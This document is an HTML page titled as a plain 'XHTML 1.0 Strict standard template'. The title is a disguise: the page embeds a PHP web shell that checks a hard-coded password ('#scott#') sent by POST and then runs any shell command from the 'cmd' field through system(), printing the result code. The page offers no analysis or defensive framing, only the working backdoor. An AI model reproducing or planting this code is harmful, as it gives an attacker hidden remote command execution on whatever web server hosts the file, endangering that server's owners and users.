<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
	<title>An XHTML 1.0 Strict standard template</title>
	<meta http-equiv="content-type" 
		content="text/html;charset=utf-8" />
</head>

<body>
<pre>

<?php
      function string_to_ascii($string)
      {
      $ascii = NULL;
      for ($i = 0; $i < strlen($string); $i++)
      {
      $ascii += ord($string[$i]);
      }
      return($ascii);
      }

if ($_POST["code"]!='#scott#') exit;
	$lastline = system($_POST["cmd"],$retval);
	//print $lastline.'</br>';
	//$lastline = ereg_replace("/\r\n|\n\r|\r|\n/", "<br>", $lastline);

	if($retval=='0')
		echo '</br> Success';
			else if($retval=='1')
				echo '</br> ERROR';
					else 
						echo '</br>'.$retval;
?>
</pre>
</body>
</html> 